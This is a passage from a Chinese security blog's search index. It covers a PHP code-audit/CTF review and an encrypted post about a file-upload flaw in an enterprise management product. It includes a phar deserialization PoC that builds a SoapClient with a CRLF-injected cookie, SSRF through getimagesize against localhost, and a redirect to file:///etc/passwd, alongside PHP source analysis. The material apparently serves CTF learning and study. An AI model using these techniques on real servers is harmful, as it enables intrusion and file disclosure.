Soap反序列化看一眼就会发现纯纯的phar反序列化打php内置Soap类反序列化 poc: 12345678910111213&lt;?php$a = new SoapClient(null, array('location' =&gt; 'http://127.0.0.1/flag.php', 'user_agent' =&gt; &quot;AAA:BBB\\r\\n&quot; . &quot;Cookie:PHPSESSID=22704eeclr7famlh9s21m9to26&quot;, 'uri' =&gt; '123'));@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub// $a = new Mysql();$phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();copy(&quot;./phar.phar&quot;, &quot;poc.gif&quot;); 怼半天没通 0x02 想法2 getimagesize-URL请求这里我们要仔细看一下源码 1234567891011121314function checkimg($img){ $check=getimagesize($img); if (($check!=false) &amp;&amp; ($check['mime'] == 'image/gif')){ echo &quot;safe image&quot;; } else{ echo &quot;go away hacker&quot;; }}$img=$_GET[&quot;img&quot;]; if (isset($img)){ checkimg($img);} 这里没有任何所谓的check 只是单纯的用getimagesize解析一下我们的参数 我就试了一下upload.php?img=http://127.0.0.1/flag.php 然后就获得flag.txt 看一下php官网对于这个函数的解释 好吧 默认支持url参数 从4.0.5添加的 基础功不扎实 这都不知道 0x03 代码分析看一下getimagesize函数的定义 还是大家非常熟悉的php_stream_open_wrapper 但今天聊点其他的 如果发出http请求之后会交给 123php_stream_url_wrap_http_ex http_fopen_wrapper.c:741php_stream_url_wrap_http http_fopen_wrapper.c:971_php_stream_open_wrapper_ex streams.c:2126 在php_stream_url_wrap_http_ex获取服务器返回的数据之后会解析header ​ 如果Location存在并且状态码((response_code &gt;= 300 &amp;&amp; response_code &lt; 304)|| 307 == response_code || 308 == response_code)时就会至follow_location为真 12345678910111213if (!strncasecmp(http_header_line, &quot;Location:&quot;, sizeof(&quot;Location:&quot;)-1)) { if (context &amp;&amp; (tmpzval = php_stream_context_get_option(context, &quot;http&quot;, &quot;follow_location&quot;)) != NULL) { follow_location = zval_is_true(tmpzval); } else if (!((response_code &gt;= 300 &amp;&amp; response_code &lt; 304) || 307 == response_code || 308 == response_code)) { /* we shouldn't redirect automatically if follow_location isn't set and response_code not in (300, 301, 302, 303 and 307) see http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html#sec10.3.1 RFC 7238 defines 308: http://tools.ietf.org/html/rfc7238 */ follow_location = 0; } strlcpy(location, http_header_value, sizeof(location)); } 随后判断是不是http[s]请求 1234567891011121314151617181920212223242526272829303132333435363738394041424344char new_path[HTTP_HEADER_BLOCK_SIZE]; char loc_path[HTTP_HEADER_BLOCK_SIZE]; *new_path='\\0'; if (strlen(location)&lt;8 || (strncasecmp(location, &quot;http://&quot;, sizeof(&quot;http://&quot;)-1) &amp;&amp; strncasecmp(location, &quot;https://&quot;, sizeof(&quot;https://&quot;)-1) &amp;&amp; strncasecmp(location, &quot;ftp://&quot;, sizeof(&quot;ftp://&quot;)-1) &amp;&amp; strncasecmp(location, &quot;ftps://&quot;, sizeof(&quot;ftps://&quot;)-1))) { if (*location != '/') { if (*(location+1) != '\\0' &amp;&amp; resource-&gt;path) { char *s = strrchr(ZSTR_VAL(resource-&gt;path), '/'); if (!s) { s = ZSTR_VAL(resource-&gt;path); if (!ZSTR_LEN(resource-&gt;path)) { zend_string_release_ex(resource-&gt;path, 0); resource-&gt;path = zend_string_init(&quot;/&quot;, 1, 0); s = ZSTR_VAL(resource-&gt;path); } else { *s = '/'; } } s[1] = '\\0'; if (resource-&gt;path &amp;&amp; ZSTR_VAL(resource-&gt;path)[0] == '/' &amp;&amp; ZSTR_VAL(resource-&gt;path)[1] == '\\0') { snprintf(loc_path, sizeof(loc_path) - 1, &quot;%s%s&quot;, ZSTR_VAL(resource-&gt;path), location); } else { snprintf(loc_path, sizeof(loc_path) - 1, &quot;%s/%s&quot;, ZSTR_VAL(resource-&gt;path), location); } } else { snprintf(loc_path, sizeof(loc_path) - 1, &quot;/%s&quot;, location); } } else { strlcpy(loc_path, location, sizeof(loc_path)); } if ((use_ssl &amp;&amp; resource-&gt;port != 443) || (!use_ssl &amp;&amp; resource-&gt;port != 80)) { snprintf(new_path, sizeof(new_path) - 1, &quot;%s://%s:%d%s&quot;, ZSTR_VAL(resource-&gt;scheme), ZSTR_VAL(resource-&gt;host), resource-&gt;port, loc_path); } else { snprintf(new_path, sizeof(new_path) - 1, &quot;%s://%s%s&quot;, ZSTR_VAL(resource-&gt;scheme), ZSTR_VAL(resource-&gt;host), loc_path); } } else { strlcpy(new_path, location, sizeof(new_path)); } 如果返回Location为合法url 1234HTTP/1.1 307Location: http://localhost:1234/123 则会跳转 否则会拼接到原有url后跳转 1234HTTP/1.1 307Location: file:///etc/passwd 0x04 otherphp_stream_url*中会使用php_url_free函数对传入的数据进行严格的替换无法进行CRLF 123456789101112131415161718PHPAPI void php_url_free(php_url *theurl){ if (theurl-&gt;scheme) zend_string_release_ex(theurl-&gt;scheme, 0); if (theurl-&gt;user) zend_string_release_ex(theurl-&gt;user, 0); if (theurl-&gt;pass) zend_string_release_ex(theurl-&gt;pass, 0); if (theurl-&gt;host) zend_string_release_ex(theurl-&gt;host, 0); if (theurl-&gt;path) zend_string_release_ex(theurl-&gt;path, 0); if (theurl-&gt;query) zend_string_release_ex(theurl-&gt;query, 0); if (theurl-&gt;fragment) zend_string_release_ex(theurl-&gt;fragment, 0); efree(theurl);}","link":"/2022/06/22/%E4%B8%80%E6%AC%A1php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%A4%8D%E4%B9%A0/"},{"title":"时空智友企业信息管理 V11.0 文件上传漏洞","text":"ec08e96b5338be06420cdb5a0b859b7ad1a54660acf8ef14047576236f5a71fced9ed2f919e5d847649b4b64f74577da6b522c620f9f4459371f13fdc4b64c82fed2e2f7202fc504da404521d12c6e9195d2dc31c54f604bf69ad8abe915d6efc955d9817bfccb4531338e5b640e392ad8ef206800e87944f961588687629c7ee9d199687caf9f876e33367818c8908142be481dd45c932c1d10f206402b2428c1bd3f4ddce84fed6d51c0673d454e9dd3cf3c7ab24ee0942efdc40c165e371904539dee352d34b9c7066641d969c6bbe40dbcdb73a146404cdea167ff84e22933ece7c163eaad10f90a67619e2d530092c80d57be786e361a4b6af5de27760a545aa745fe75d87ef95be961981162eeb24ea265d6e5d75ca75e4c9baf8884797c178f88e67c9a6af4729380850952555e355ffb77725dc0dcd6e63d8a639819ea23085fbcb36eee981e307350e5b119b80a12bb4fccac9128b177ac9f96b620c5f8e6ce44fa8b97976de3edf02228d388ea13f271bc19370744e97d862d59a5b52e97a1104a8797e153f2d83fb7300eaf1cbe07377e74c8fd34a9d6316013aa27b8eba0335f360ad2dbb6a9b8e1b181e727fa54802651cb04046e22c30e7c8966f5e29b806a7eb2ee87179d33a07c5b6820e903404d210b0dee211313dde2aef0b21c1c998a002c66abccf9feb51394c9ee6db33472e4b13a9d9b14d27df88baceda7b63127be446467cec2b7657713cf2ebfb4c69d7d759e1ca66c72896397 Hey, password is required here.","link":"/2022/06/23/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86-V11-0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"}],"tags":[{"name":"php","slug":"php","link":"/tags/php/"},{"name":"代码审计","slug":"代码审计","link":"/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"pbootcms","slug":"pbootcms","link":"/tags/pbootcms/"},{"name":"ctf","slug":"ctf","link":"/tags/ctf/"},{"name":"SUSCTF2022","slug":"SUSCTF2022","link":"/tags/SUSCTF2022/"},{"name":"EDISEC","slug":"EDISEC","link":"/tags/EDISEC/"},{"name":"dash","slug":"dash","link":"/tags/dash/"},{"name":"vscode","slug":"vscode","link":"/tags/vscode/"},{"name":"调试","slug":"调试","link":"/tags/%E8%B0%83%E8%AF%95/"},{"name":"STARCTF2022","slug":"STARCTF2022","link":"/tags/STARCTF2022/"},{"name":"phar反序列化","slug":"phar反序列化","link":"/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"PHP","slug":"PHP","link":"/tags/PHP/"},{"name":"禅道","slug":"禅道","link":"/tags/%E7%A6%85%E9%81%93/"},{"name":"帆软","slug":"帆软","link":"/tags/%E5%B8%86%E8%BD%AF/"},{"name":"泛微9.5","slug":"泛微9-5","link":"/tags/%E6%B3%9B%E5%BE%AE9-5/"},{"name":"SQL注入","slug":"SQL注入","link":"/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"时空智友企业信息管理","slug":"时空智友企业信息管理","link":"/tags/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86/"},{"name":"文件上传","slug":"文件上传","link":"/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"categories":[{"name":"代码审计","slug":"代码审计","link":"/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"ctf","slug":"ctf","link":"/categories/ctf/"},{"name":"二进制","slug":"二进制","link":"/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/"}]}